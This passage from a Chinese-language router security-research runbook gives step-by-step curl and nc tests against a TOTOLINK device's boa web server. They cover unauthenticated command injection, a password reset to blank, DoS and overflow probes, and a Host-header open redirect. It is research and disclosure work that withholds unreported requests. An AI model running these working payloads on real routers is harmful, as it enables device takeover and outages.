> **方向與型別一起看，才分得出「它回了我」和「它替我跑了 ping」。**

> ⚠️ **`302` 不代表成功也不代表失敗。** 這個 handler 無論如何都會 302
> （`A3.8` 量過：帶 `submit-url` 的空 POST 也回 302 → `status.htm`）。
> **HTTP 回應在這一節裡沒有判別力，那正是這一節存在的理由。**

> ❌ **沒有任何 ICMP → 不要立刻換 payload。** 先確認三件事，順序固定：
> （a）`A3.9.1` 的對照組現在還過嗎（server 可能被前面某一節弄掉了）；
> （b）`curl` 真的送出去了嗎（`-w` 的 `http_code` 是 `000` 就是沒送到）；
> （c）**參數名對嗎** —— `sysCmd` 大小寫敏感，來源是 `/bin/boa` 的字串表。
> 三個都沒問題才是「參數在到達 `system()` 之前被擋掉了」，而那是 `P3-3` 的反證條件。

> 🔴 **這一發成立 = CVE-2024-51228 在這台上重現，而且是未認證。**
> NVD 給它 `PR:H`（需要高權限）。**這一發沒有帶任何憑證** ——
> 那就是 [`docs/disclosure.md`](docs/disclosure.md) `D-6` 的全部內容，
> 而它從 `held` 變成可發布就靠這一步。**下一步把它講精確。**

#### A3.9.3 同一發，帶憑證 —— 把「未認證」講到能被反駁

```bash
# 憑證來自 A3.6.3 從自己的 flash 解出來的那一組,不是猜的
curl -s -o /dev/null -w 'with credentials: HTTP %{http_code}\n' \
  -u '<USER_NAME>:<USER_PASSWORD>' \
  -X POST http://10.1.1.1/boafrm/formSysCmd \
  --data-urlencode 'sysCmd=ping -c 1 10.1.1.100' --data 'submit-url=/syscmd.htm'
```

**預期**：一樣是 `302`，一樣有 ICMP。**兩者行為相同，就是「認證與否不影響」** ——
比只做未認證那一發強，因為它排除了「其實我不小心帶了什麼」。

#### A3.9.4 docroot oracle —— 以及為什麼少了 `;#` 會拿到一個空檔

```bash
curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
  --data-urlencode 'sysCmd=cat /etc/version > /var/web/w06.txt;#' \
  --data 'submit-url=/syscmd.htm'
sleep 2
curl -s http://10.1.1.1/w06.txt
```

**預期**：

```text
TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
```

> 🔴 **`;#` 不是裝飾。** handler 組出來的是 `%s 2>&1 > %s`，也就是
> `cat /etc/version > /var/web/w06.txt 2>&1 > /tmp/syscmd.log`，而 `sh` 裡
> **最後一個 stdout 重導向贏** —— 檔案會被建立，然後是空的。
> `;#` 把後面整段註解掉。**空檔和被過濾掉，看起來完全一樣。**

> ★ **這一行輸出同時是三件事**：命令執行的證據、**這台的 build 字串**、
> 以及 `CX` 那個發現的現場 —— `/etc/version` 有 `CX`，而 `status.htm` 沒有。

> ⚠️ **`PROGRESS` 開放 #18：`boa.conf` 設了 `DirectoryCache /tmp`，
> 而「開機後才建立的檔案 `boa` 服不服務」從來沒測過。**
> 這一步**就是**那個測試。拿不回來 → 先別怪注入：`A3.9.2` 的 ICMP 已經
> 證明命令跑了，所以拿不回來是 **oracle** 的問題不是注入的問題，
> 而那個區別正是排這個順序的理由。

#### A3.9.5 `P5-5`：`/proc/cpuinfo` —— W02 開放 #6 的最後一塊（關 `P5-5`）

```bash
curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
  --data-urlencode 'sysCmd=cat /proc/cpuinfo > /var/web/cpu.txt;#' \
  --data 'submit-url=/syscmd.htm'
sleep 2
curl -s http://10.1.1.1/cpu.txt
```

**預期**：一段 `system type` / `cpu model` 之類的欄位。**要看的是核心名字。**

> ★ **這一格從 W02 開到現在。** SoC 是 RTL8196E，而它常被記載成 RLX5281 核心
> （對上 8196C 的 RLX4181），這件事直接影響 W01 讀出來的「MIPS-I」。
> `/proc/cpuinfo` 一行就答完，而**這台沒有 shell** ——
> 所以它一直答不了，直到命令注入成立。
>
> **反過來也要看**：`P5-5` 的預測是「`boa` 用了 142 次 `lwl`/`lwr`/`swl`/`swr`，
> 所以跑它的核心必須實作這些指令」。cpuinfo 顯示的核心**不**支援 → 那不是
> cpuinfo 錯，是**那 142 個計數量錯了、或那些程式路徑從來沒被執行過**。

#### A3.9.6 另外三個標的（關 `P3-1` · `P3-2` · `P3-4`）

**三個標的的揭露狀態不一樣，而這一節的寫法就因此不一樣。**

| | 標的 | 狀態 | 這裡怎麼寫 |
|---|---|---|---|
| **A2** | `formWsc` / `peerPin` | CVE-2025-3987 / 4462，**已公開** | 完整命令 |
| **A3** | `formRoute` / `subnet` | **`docs/disclosure.md` `D-1`，未通報** | **只給形狀，不給可貼上的請求** |
| **A4** | `formWsc` / `targetAPSsid` | CVE-2025-6299，**已公開** | 完整命令 |

```bash
# A2 —— peerPin 只寫 /var,重開就乾淨,所以排在 localPin(A3.10)之前
sudo tcpdump -ni "$IF" -w "$HOME/fwre-work/dumps/w06-p31.pcap" icmp &
sleep 2
curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
  --data-urlencode 'peerPin=1;ping -c 3 10.1.1.100;#' \
  --data 'submit-url=/wireless.htm'
sleep 4 ; sudo pkill -x tcpdump ; sleep 1
tshark -r "$HOME/fwre-work/dumps/w06-p31.pcap" -T fields -e ip.src -e icmp.type
```

```bash
# A4 —— 預期不是命令注入而是溢位:R2 的 6 個 site 不含 targetAPSsid
curl -s -o /dev/null -w 'A4: HTTP %{http_code}\n' -X POST http://10.1.1.1/boafrm/formWsc \
  --data-urlencode 'targetAPSsid=1;ping -c 3 10.1.1.100;#' \
  --data 'submit-url=/wireless.htm'
```

> 🔴 **A3（`formRoute` / `subnet`）的請求不寫在這裡，而這不是疏漏。**
> 它是這個專案自己找到的、**沒有 CVE 編號、還沒通報任何人**的一條。
> repo 的規則是：**發現可以公開，重現要跟著揭露狀態走。**
> 指出 handler 與參數名是發現（`test-ledger.md` 的 `P3-2` 那一列已經寫了）；
> 給一個可以複製貼上的請求不是。
>
> **操作上**：用 A2 完全相同的請求形狀，handler 與參數名照 `P3-2` 那一列，
> `submit-url` 用 `/route.htm`。**判據也一樣：來源 `10.1.1.1` 的 type 8。**
>
> ⚠️ **這一發打的是路由設定。** 一個參數缺席的 POST 就可能改掉這台的路由表，
> 而你正是從那條路徑連進去的。**前後快照（`A2.3`）一定要有。**

#### A3.9.7 `P3-7`：改用 GET，以及 submit 按鈕名（關 `P3-7`）

```bash
# 1) 同一個 handler,參數放在 query string
curl -s -o /dev/null -w 'GET  : HTTP %{http_code}\n' \
  "http://10.1.1.1/boafrm/formSysCmd?sysCmd=ping%20-c%203%2010.1.1.100&submit-url=/syscmd.htm"
# 2) POST,但加上不同的 submit 按鈕名
for b in submit-url Apply save "Save Setting"; do
  curl -s -o /dev/null -w "btn=$b : HTTP %{http_code}\n" \
    -X POST http://10.1.1.1/boafrm/formSysCmd \
    --data-urlencode 'sysCmd=ping -c 1 10.1.1.100' --data-urlencode "$b=/syscmd.htm"
done
```

**預期**：GET 那一發**不會**執行 —— `A3.5` 量到所有 `/boafrm/formX` 的 GET
都在 `translate_uri` 就被 302 掉，根本到不了 `handleForm`。

> ★ **GET 不通是好消息，而且它是一個可以講的結論**：這條注入**不能**用一個
> `<img src=...>` 從瀏覽器打出去。**但這台沒有 session、用的是 HTTP Basic**
> （`A3.7`），所以一個已經快取憑證的瀏覽器仍然會自動附上憑證 ——
> **「沒有 session」不等於「沒有 CSRF 面」**，只是這個 handler 要 POST。

#### A3.9.8 清乾淨

```bash
curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
  --data-urlencode 'sysCmd=rm -f /var/web/w06.txt /var/web/cpu.txt;#' \
  --data 'submit-url=/syscmd.htm'
curl -s -o /dev/null -w 'w06.txt now: HTTP %{http_code}\n' http://10.1.1.1/w06.txt
```

**預期**：`404`。`/var` 是 ramfs，重開機也會清掉 —— **但不要靠重開機收尾，
因為那樣你就不知道是刪掉了還是重開清掉的。**

---

### A3.10 🔌 ★★ 第 ⑤ 環：指著 flash 上被改掉的那幾個 byte（關 `P3-5`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3（開火）+ T2（前後快照） | **寫 flash，重開機不會消失** | [`RUNBOOK` §8.12.19](RUNBOOK.md) | 2026-08-17 夜（九個 byte，而且寫在 `H601` 不是 `COMPCS`） |

**先決條件**：`A2.5` 通過（`P0-3`）；`A3.9.2` 已證明注入成立；前置快照已抓

**別人證明命令執行了，靠的是 HTTP 回應或一個 ICMP 封包。
這一節是指著 SPI NOR 上被改掉的那幾個 byte 說「這是那個 HTTP 請求做的」。**

#### A3.10.1 前：抓快照（回第 2 站）

照 `A2.3` 抓一份 `-pre.bin`。**這一步要斷電重開進 bootloader，所以它排在
第 3 站所有純讀的東西之後。**

#### A3.10.2 開火，用一個無害但認得出來的值

```bash
curl -s -o /dev/null -w 'HTTP %{http_code}\n' -X POST http://10.1.1.1/boafrm/formWsc \
  --data-urlencode 'localPin=13572468' --data 'submit-url=/wireless.htm'
sleep 5
```

> 🔴 **這一發不帶任何分隔符，而那是刻意的。** `localPin=13572468` 走的是
> `sprintf(buf[100], "flash set HW_WLAN0_WSC_PIN %s", localPin); system(buf)`
> 的**正常**路徑 —— 目的不是注入，是讓 `flash set` 把一個**我選的值**寫進設定區。
> **注入那一半 `A3.9` 已經證明了；這一節證明的是那條路真的到 flash。**

> ⚠️ **`13572468` 是 8 位數，因為 WPS PIN 就是 8 位數。**
> 換一個長度或加分隔符，你就同時改了兩個變數。

#### A3.10.3 後：再抓一份，然後把差異翻譯成欄位名

```bash
D="$HOME/fwre-work/dumps"
bash tools/config-attrib.sh "$D/"*-pre.bin "$D/config-region-post-p35.bin"
```

**預期**：`COMPCS` 有一個欄位動了，而它的名字是 `HW_WLAN0_WSC_PIN`，值是 `13572468`。

> ★ **這一步一次證明五件事，而每一件都指得回一份可重新產生的產物：**
>
> | | |
> |---|---|
> | 命令真的執行了 | 不是靠回應、不是靠封包，靠**持久儲存被改了** |
> | `system()` 收到的是我送的字串 | 寫進去的值就是我送的值 |
> | W04 的根因讀對了 | 那一行確實是 `flash set HW_WLAN0_WSC_PIN %s` |
> | W04-2 的解碼器是對的 | 它能把 flash 的變化翻譯成一個**有名字**的欄位 |
> | W02 的 dump 路徑仍然有效 | 同一條 `FLR`+`DB`，第三次用途 |

> 🔴 **`H601`（`0x6000`–`0x8000`）必須是 `UNCHANGED`。** 每一次歸因都先看那一行。
> 它動了 → 停下來，那是這台唯一一份 MAC 與射頻校準。

> ⚠️ **`COMPDS` 大概也會動。** `A3.8.5` 量到未認證的設定寫入會**同時**覆蓋出廠預設區。
> 那不是這一節的錯，是 `D-10` 那個發現本身 —— **但它代表 `A2.6` 的還原要再做一次**，
> 而這次可以順便驗證：**`COMPDS` 是不是每一次 POST 都被覆蓋，還是只有某些 handler。**

#### A3.10.4 改回去，並確認改回去了

```bash
# 原值從 -pre.bin 解出來,不要用記憶裡的
"$HOME/fwre-work/venv/bin/python" -m fwrecon compcs "$D/"*-pre.bin --offset 0xC000 \
  --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
  --disclosure reveal -f md | grep -i 'WSC_PIN'
```

```bash
curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
  --data-urlencode 'localPin=<上面那個原值>' --data 'submit-url=/wireless.htm'
```

> **能把裝置恢復原狀是這個實驗完整的一部分**，而且它順便證明這個注入是
> **可重複、可控、可逆的** —— 不是一次僥倖。

---

### A3.11 🔌 未認證改管理密碼，以及把它設成空字串（關 `P10-3` · `P10-4`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **寫 flash，而且寫的是憑證** | [`RUNBOOK` §8.12.20](RUNBOOK.md) | 2026-08-17 夜（`P10-3` 與 `P10-4` 都成立） |

**先決條件**：`A3.6` / `A3.7` 已完成（那條 CVE-2019-19822 → 19823 的鏈**必須先做完**）；
`A2.6` 的還原路徑已經驗過；前置快照已抓

> 🔴 **這一節排在第 3 站的倒數第二，理由不是危險程度，是依賴關係。**
> `A3.6`+`A3.7` 那條鏈的內容是「從 flash 解出來的密碼可以登入」。
> **這一節會把那個密碼換掉**，所以順序反了就毀掉這個專案最硬的一條證據。

#### A3.11.1 `P10-3`：不帶憑證改密碼

```bash
curl -s -o /dev/null -w 'HTTP %{http_code}\n' -X POST http://10.1.1.1/boafrm/formPasswordSetup \
  --data 'username=admin' --data 'newpass=w06test' --data 'confirmpass=w06test' \
  --data 'submit-url=/password.htm'
sleep 3
curl -s -o /dev/null -w 'old creds: %{http_code}\n' -u '<舊帳號>:<舊密碼>' http://10.1.1.1/password.htm
curl -s -o /dev/null -w 'new creds: %{http_code}\n' -u 'admin:w06test' http://10.1.1.1/password.htm
```

**預期**：舊憑證 `302`（被擋），新憑證 `200`。**那就是未認證改掉管理密碼。**

> ⚠️ **參數名是猜的，這裡要誠實。** `formPasswordSetup` 的實際欄位名要從
> `/web` bundle 裡那一頁的表單讀出來，**不是從別的機型抄**。
> 打之前先 `curl -s http://10.1.1.1/password.htm`（帶憑證）把 `<input name=...>` 抓出來。
> **拿錯欄位名的結果是「沒反應」，而那跟「被擋下來」長得一模一樣。**

#### A3.11.2 `P10-4`：把密碼設成空字串（本專案獨家，`D-4`）

```bash
curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formPasswordSetup \
  --data 'username=admin' --data 'newpass=' --data 'confirmpass=' \
  --data 'submit-url=/password.htm'
sleep 3
curl -s -o /dev/null -w 'no credentials at all: %{http_code}\n' http://10.1.1.1/password.htm
```

**預期**：`200`。`0x0040bd18` 的 `beq` 讀起來是「`USER_PASSWORD` 為空時整段比對被跳過」，
**而如果它成立，這台在這個狀態下對每一個頁面都不再要求任何憑證。**

> 🔴 **這是 `D-4`，沒有任何 CVE 描述這個行為，而它的價值在於「可達性」不在於那個分支。**
> 分支存不存在是靜態的事，W04-2 已經讀了。**真正的問題是：有沒有一條未認證的路
> 可以把它設成空。** `A3.11.1` 就是那條路 —— 兩項合起來才是一個發現。

> ❌ **仍然要求認證 → `X-9` 撤回**，那個 `beq` 的語意讀錯了。
> **這也是一個結果**，而且它要寫進 `docs/disclosure.md` 把 `D-4` 收掉。

#### A3.11.3 還原憑證，並且驗證還原了

```bash
curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formPasswordSetup \
  --data 'username=<原帳號>' --data 'newpass=<原密碼>' --data 'confirmpass=<原密碼>' \
  --data 'submit-url=/password.htm'
sleep 3
curl -s -o /dev/null -w 'restored: %{http_code}\n' -u '<原帳號>:<原密碼>' http://10.1.1.1/password.htm
curl -s -o /dev/null -w 'unauth  : %{http_code}\n' http://10.1.1.1/password.htm
```

**預期**：`restored: 200`，`unauth: 302`。

> 🔴 **兩行都要看。** 只看第一行的話，「密碼還原了」和「這台已經不檢查密碼了」
> 會給出一樣的輸出。

---

### A3.12 🔌 會把 `boa` 弄掉的那一梯次 —— 排在第 3 站最後（關 `P4-1` · `P4-2` · `P4-3` · `P4-4` · `P2-6`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **會讓 web server 消失，而且 `rcS` 只起它一次** | [`RUNBOOK` §8.12.21](RUNBOOK.md) | 2026-08-17 夜（`P4-1`–`P4-4` 全部反證；另發現一個請求殺掉 server） |

**先決條件**：**這一站其他每一節都做完了**；快照已抓

> 🔴 **`rcS` 起 `boa` 一次，沒有任何東西會重起它。** `A3.8` 量過兩次：
> `boa` 掉了之後二十分鐘還是掉的，`ping` 照樣通，console 一行都不印。
> **所以這一梯次每一項之後都要探活，而復原手段只有斷電重開。**

```bash
alive() { curl -sf -m 5 -o /dev/null http://10.1.1.1/ && echo "  alive" || echo "  DEAD"; }
```

#### A3.12.1 `P4-1`：不帶 `submit-url`（`D-2`，本專案獨家）

```bash
alive
curl -s -o /dev/null -w 'no submit-url: HTTP %{http_code} in %{time_total}s\n' -m 15 \
  -X POST http://10.1.1.1/boafrm/formWlanRedirect
alive
```

**預期（照 2015 那份量出來的讀法）**：參數缺席時 handler 拿到 `""` 字面量的**位址**，
然後 `strcpy` 進去 —— 而那在唯讀段。**一個請求、零 payload 的未認證 DoS。**

> ⚠️ **`P4-1` 跟 `A3.8` 量到的那個停頓是兩件事**，不要混講：
> `A3.8` 那個是**帶** `submit-url` 的合法 POST，會佔住 server 4–10 秒（`D-9`）；
> 這一個是**不帶**，而它寫進唯讀段。**同一個 handler，兩種完全不同的失效。**

> ❌ **`alive` 之後是 `DEAD` → 這一項成立，而且第 3 站到此為止。**
> 剩下的 `P4-2`/`P4-3`/`P4-4`/`P2-6` 各自需要一次斷電重開 + 45 秒。
> **先記錄，再決定要不要花那幾次開機循環。**

#### A3.12.2 `P4-2`：`submit-url=` 空值

```bash
alive
curl -s -o /dev/null -w 'empty submit-url: HTTP %{http_code}\n' -m 15 \
  -X POST http://10.1.1.1/boafrm/formWlanRedirect --data 'submit-url='
alive
```

**預期**：空字串與缺席是兩條不同的路徑，破壞程度較低。
**兩者行為相同 → 它們其實是同一條路徑，`P4-2` 併回 `P4-1`。**

#### A3.12.3 `P4-3` / `P4-4`：兩組長度階梯，而它們的偏移不同

```bash
for n in 96 100 104 120 160 200; do
  alive
  printf 'len=%d ' "$n"
  curl -s -o /dev/null -w 'HTTP %{http_code}\n' -m 15 \
    -X POST http://10.1.1.1/boafrm/formWlanRedirect \
    --data-urlencode "submit-url=/$(python3 -c "print('A'*($n-1))")"
done
alive
```

**預期**：`lastUrl[100]` 的大小來自符號表不是猜的，而**緊接其後的兩個物件是
`needReboot` 與 `run_init_script_flag`** —— 所以溢位先改到的是**旗標**，
不是返回位址。**觀察點因此不是崩潰，是這台會不會自己重開機。**

> ★ **這就是為什麼這一項留在 W06 而 `P4-5` 之後全部移到 W07：**
> 這一組有一個**事先寫下來的、具體的、可觀察的**預測（`.bss` 佈局 → 重開機），
> 一個請求一次。`P4-5` 以後那些要的是崩潰 + `epc` 可控，
> **而這台沒有 shell、沒有 gdbserver，`epc` 的 oracle 目前並不存在。**

```bash
# P4-4 —— 20-byte 那一組,偏移與 100 那組完全不同
for n in 16 20 24 40 80; do
  alive
  printf 'ifname len=%d ' "$n"
  curl -s -o /dev/null -w 'HTTP %{http_code}\n' -m 15 \
    -X POST http://10.1.1.1/boafrm/formWlanSetup \
    --data-urlencode "ifname=$(python3 -c "print('B'*$n)")" --data 'submit-url=/wireless.htm'
done
alive
```

#### A3.12.4 `P2-6`：HTTP 協定層畸形（**這一梯次的最後一項**）

```bash
alive
printf 'GET / \r\n\r\n'                          | timeout 5 nc 10.1.1.1 80 | head -3 ; alive
printf 'GET / HTTP/9.9\r\nHost: x\r\n\r\n'       | timeout 5 nc 10.1.1.1 80 | head -3 ; alive
printf 'POST /boafrm/formSysCmd HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nsysCm\r\n0\r\n\r\n' \
  | timeout 5 nc 10.1.1.1 80 | head -3 ; alive
```

**預期**：Boa 0.94 對 chunked 支援很差，畸形請求較可能造成解析錯誤而不是繞過。
**全部正確回 `400` → 這條收掉，不用再花時間。**

> 🔴 **每一發之後都 `alive`，而且畸形請求排在整節最後** ——
> 它最可能弄掛 server，而弄掛之後前面每一項的結果都會變成「連不上」，
> **那跟「端點不存在」長得一模一樣。**

---

### A3.13 🔌 三個請求：未初始化的憑證對，以及 `Host` 到底被檢查了沒（關 `P2-9` · `P8-5`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **純讀。**三個 GET，不寫任何東西，不用斷電 | [`RUNBOOK` §8.12.22](RUNBOOK.md) | 尚未執行（2026-08-18 寫，模擬環境上已成立） |

**先決條件**：`A3.1` 的網段已設好；`A3.7` 已完成（要拿真憑證當正對照）

> 🔴 **這一節排在第 3 站最前面，理由是它什麼都不動。** 它之後的每一節都會改設定
> 或弄掉 `boa`，而這一節的三個請求在一台完全乾淨的機器上跑，成本是零。
> **如果它成立，它是這個專案目前最重的一條發現**；如果不成立，那它證明的是
> 模擬環境與裝置在未初始化堆疊上不一致 —— 那也是一個結果，而且同樣要記。

#### A3.13.1 `P2-9`：兩對憑證緩衝區，其中一對沒有人寫過

**桌面上讀到的東西**（`notes/uninit-credential-pair.md`）：`process_header_end`
拿使用者送的憑證去比**兩對**堆疊緩衝區。

```text
0040bd48  strcmp(送來的帳號, sp+0x18)   ← 先比這一對
0040bd90  strcmp(送來的密碼, sp+0x38)
0040bda4  命中 → req->0xb0 = 2          ← 比真憑證那條路高一級

0040bdb8  strcmp(送來的帳號, sp+0x58)   ← apmib_get(0xb6) 寫的
0040be00  strcmp(送來的密碼, sp+0x78)   ← apmib_get(0xb7) 寫的
0040be18  命中 → req->0xb0 = 1
```

整支函式 1,964 bytes，碰到 `sp+0x18` 與 `sp+0x38` 的指令**只有三個讀取**。

> 🔴 **實際要送的請求不在這個 repo 裡，而那是刻意的。**
> `D-15` 尚未通報，而且它在**任何人下載得到的 V2.1.2 映像上也成立**。
> `docs/disclosure.md` 的規則是「reproduction 跟著揭露狀態走」，所以請求本體在
> **`$FWRE_WORK/disclosure/D-uninitialised-credential-pair.txt`**（mode 600，
> repo 之外）。這一節負責的是**推理、預期結果與對照組**；照著那個檔案送。
>
> `A3.11.2` 沒有照這條規則做，那是一個治理缺陷，記在
> `docs/disclosure.md § A governance defect`。

**四個請求一起打，因為單獨一個成功什麼都不證明：**

```bash
# 真憑證從 A3.7 解出來的那一組，不要用預設值猜
U=admin; P=admin
for label in none real wrongpw bypass; do
  printf '%-8s ' "$label"
  case "$label" in
    none)    curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -m 6 \
               http://10.1.1.1/blank.htm ;;
    real)    curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -m 6 \
               -u "$U:$P" http://10.1.1.1/blank.htm ;;
    wrongpw) curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -m 6 \
               -u "$U:definitelynotthepassword" http://10.1.1.1/blank.htm ;;
    bypass)  echo '照 $FWRE_WORK/disclosure/D-uninitialised-credential-pair.txt' ;;
  esac
done
```

**預期**（模擬環境上兩個 profile 都是這樣）：

```text
none     302 138
real     200 333
wrongpw  302 138
bypass   200 333      <- 與 real 逐位元組相同
```

> ⚠️ **先確認儲存密碼不是空的，否則量到的是 `D-4` 不是 `D-15`。**
> `A3.7` 的 `wrongpw` 那一列必須是 `302`。如果它是 `200`，那表示密碼是空的、
> 比對被整個跳過，**這一節的結果不算數**，要先把密碼設回一個非空值。
> 這兩個缺陷會產生一模一樣的「不帶密碼就進得去」，而它們是不同的東西。

**判定**：`bypass` 回 `200` 且 `wrongpw` 回 `302` → `P2-9` 在矽上成立。
**反證**：`bypass` 回 `302` → 那塊堆疊在裝置上不是零，`D-15` 降級成
「模擬環境與裝置不一致」，`notes/uninit-credential-pair.md` §3 的機制論證要改寫。

#### A3.13.2 `P8-5`：`Host` 被檢查了沒，以及它會不會被反射進轉址

桌面上讀到的：`check_host` 在 `0x00410470`，嚴格，而且判定**真的**會回 400 ——
但 `0x0040bbec` 在 `vhost_root == NULL` 時跳過整個 host 區塊，而 `VHostRoot`
在這台的 `boa.conf` 是註解掉的。模擬環境上十七個 Host 全部 200。

```bash
for h in evil.example -evil.example evil..example evil_example ''; do
  printf '%-16s ' "[$h]"
  if [ -z "$h" ]; then
    curl -s -o /dev/null -w '%{http_code}\n' -m 6 http://10.1.1.1/login.htm
  else
    curl -s -o /dev/null -w '%{http_code}\n' -m 6 -H "Host: $h" http://10.1.1.1/login.htm
  fi
done
```

**預期**：全部 `200`。**反證**：任何一個回 `400` → `vhost_root` 在真機上不是
NULL，`P8-6`（rebinding）的前提要重新評估。

**反射那一半 —— 這是 `D-14`，而它需要一個被閘門擋下來的頁面：**

```bash
curl -si -m 6 -H 'Host: evil.example' http://10.1.1.1/blank.htm \
  | tr -d '\r' | grep -iE '^HTTP|^Location'
```

**預期**：

```text
HTTP/1.0 302 Redirect
Location: http://evil.example/login.htm
```

> **這是 open redirect，不是 XSS。** 模擬環境上帶標記的 `Host` 兩個 sink 都做了
> 編碼（`Location` 是 URL-encode、HTML body 是實體）。**如果實機上沒有編碼，
> 那才是 XSS，而那是一個不同、更嚴重的發現** —— 所以帶標記那一發也要打，
> 不是因為預期它會過，是因為預期它不會過。

---

### A3.14 🔌 UDP 那一輪，而且它是第一次跑不是重跑（關 `P6-4` · `P6-6` · `P6-7` · `P6-8` · `P6-12`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **純讀。**不寫、不斷電 | [`RUNBOOK` §8.12.28](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

**先決條件**：`A3.1` 的網段已設好。

```bash
sudo nmap -sU -p 53,161,1900,5060,9034,9999,20005 -sV --version-intensity 2 10.1.1.1
sudo nmap -sT -p 5555,7547 10.1.1.1
```

**預期**：9034 / 9999 / 20005 無回應；**而同一輪裡 1900 或 53 有回應當正對照**。

> 🔴 **沒有正對照的「全部關閉」量到的是鏈路，不是裝置。** UDP 沒有交握，
> 「沒有回應」與「封包沒送到」在觀測上完全相同。

---

### A3.15 🔌 UPnP：SSDP、SOAP，以及把 LAN-only 推上 WAN（關 `P6-1` · `P6-2` · `P6-3` · `P8-7`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **會建立一個埠映射，而這一節負責把它刪掉** | [`RUNBOOK` §8.12.29](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

```bash
python3 tools/bench-probe.py ssdp --host 10.1.1.1 -o dumps/w07-ssdp.json
```

> 🔴 **SOAP 的路徑是 `/upnp/control/WANIPConnection`，不是手冊寫的 `WANIPConn1`。**
> 錯的路徑會讓一整輪回 404，看起來像「這台沒有 UPnP」——而 `P1-10` 已經量到 52869 是開的。
> **一個錯的路徑產生的是一個假的否定。**

`AddPortMapping` 的四個欄位帶 shell 字元（`P6-1`，CVE-2014-8361），
`NewInternalClient` 填 `10.1.1.1`（`P8-7`）。**做完必須把映射刪掉，而且在同一節裡完成。**

---

### A3.16 🔌 DNS 身分，以及拔掉 WAN 之後（關 `P6-9` · `P6-10`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **會拔 WAN 線。**不寫設定 | [`RUNBOOK` §8.12.30](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

```bash
dig @10.1.1.1 version.bind chaos txt
dig @10.1.1.1 +short example.com
```

**`P6-9` 要的是「在聽的是哪一支」** —— `dnrd` / `dnsmasq` / `dns_protocl` 三選一，
不是「有沒有 DNS」。**`P6-10` 拔掉 WAN 線之後重跑同兩發**，看行為改不改變。

---

### A3.17 🔌 CSRF 與 DNS rebinding（關 `P8-3` · `P8-4` · `P8-6`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **`P8-4` 會改管理密碼**，所以它排在 `A3.11` 之後 | [`RUNBOOK` §8.12.31](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

> 🔴 **卡片必須引用 CVE-2023-47677（Talos）**：同一顆 SDK 的 `boa` 有 CSRF 缺陷，
> 而且**有**一個可用 iframe 繞過的防護。**凍結的預測不改**，但不引用的話，
> 結果會被讀成這個專案的發現。**而 Talos 描述的機制不是這個 binary 裡的那一個
> （這裡是 IP 比對加 uptime 過期），兩者是不是同一個功能沒有解決，卡片照這樣寫。**

---

### A3.18 🔌 假上游：NTP / DDNS / DHCP / PPPoE / SIP（關 `P8-11` · `P8-19` · `P6-5`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **要一台假 ISP 接在 WAN 側** | [`RUNBOOK` §8.12.32](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

**三列共用同一套器材，分開架等於把最貴的準備工作做三遍。**

已經知道的一件事先講，免得被當成新發現：`/usr/share/udhcpc/eth1.bound` 是一行
`sysconf conn dhcp $interface $ip $subnet $router $dns`，值變成 argv 而不是命令，
而且 `hostname` 與 `domain` **根本沒有被傳進去**。**這一節要問的是往 `sysconf`
裡面移的那一跳。**

---

### A3.19 🔌 儲存型注入：八個欄位裡這一週測得到的三個（關 `P8-2`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **會寫入設定**，前後各一份 64 KiB 快照 | [`RUNBOOK` §8.12.33](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

**測得到的三個**：UPnP 的 `NewPortMappingDescription`、`formSysLog` 那一組
（失敗登入的帳號名與 `User-Agent`）、PPPoE server name（與 `A3.18` 同一趟）。
**打不到的五個要寫成打不到，不能寫成「未觀察到」。**

**每一個都先讀模板再送封包** —— docroot 的 143 個檔在 dump 裡，有沒有輸出編碼讀得出來。

---

### A3.20 🔌 借合法功能做偵察，以及一個便宜的可用性測試（關 `P8-14` · `P8-16`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **做完之後 `boa` 很可能不在了** | [`RUNBOOK` §8.12.34](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

`P8-14` 用 `formSysCmd`（**出廠就有的功能**，`P3-3` 已證明未認證可達）掃內網。
**量到的是一個合法功能的影響範圍，不是一個新的洞。**

`P8-16`（Slowloris）排同一節：`boa` 是單一 process，**同時連線數的上限就是可用性的上限**。

> 🔴 **這一節排在需要 web server 的每一節之後，排在 `A3.24` 之前。**

---

### A3.21 🔌 線上的明文憑證，與驅動的私有 ioctl（關 `P8-17` · `P8-20`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
